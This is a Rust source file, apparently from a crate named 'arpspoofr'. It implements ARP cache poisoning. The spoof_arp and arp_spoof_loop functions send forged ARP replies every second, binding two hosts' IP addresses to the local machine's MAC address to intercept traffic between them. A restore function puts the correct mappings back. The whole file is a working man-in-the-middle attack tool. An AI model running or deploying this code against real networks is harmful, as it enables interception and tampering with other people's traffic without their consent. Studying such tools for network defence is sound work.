extern crate arpspoofr;

use arpspoofr::*;

use std::net::Ipv4Addr;

use pnet::datalink::MacAddr;
use pnet::packet::arp::ArpOperations;
use pnet::datalink::DataLinkSender;

use std::time::Duration;
use std::thread;

fn spoof_arp(tx: &mut DataLinkSender,
             local_mac: MacAddr,
             source_ip: Ipv4Addr,
             source_mac: MacAddr,
             target_ip: Ipv4Addr,
             target_mac: MacAddr) {
    // Send packet to bind source ip to local mac
    send_arp(&mut *tx, source_ip, local_mac, target_ip, target_mac, ArpOperations::Reply);

    // Send packet to bind target ip to local mac
    send_arp(&mut *tx, target_ip, local_mac, source_ip, source_mac, ArpOperations::Reply);
}

pub fn arp_spoof_loop(interface: &str,
                      local_mac: MacAddr,
                      source_ip: Ipv4Addr,
                      source_mac: MacAddr,
                      target_ip: Ipv4Addr,
                      target_mac: MacAddr) {
    let (mut tx, _, _) = open_interface(interface);
    loop {
        spoof_arp(&mut *tx, local_mac, source_ip, source_mac,
                  target_ip, target_mac);
        thread::sleep(Duration::from_millis(1000));
    }
}

pub fn restore_arp_state(interface: &str,
                         source_ip: Ipv4Addr,
                         source_mac: MacAddr,
                         target_ip: Ipv4Addr,
                         target_mac: MacAddr) {
    let (mut tx, _, _) = open_interface(interface);

    // Restore correct state of the world
    send_arp(&mut *tx, source_ip, source_mac,
             target_ip, target_mac, ArpOperations::Reply);
    send_arp(&mut *tx, target_ip, target_mac,
             source_ip, source_mac, ArpOperations::Reply);
}

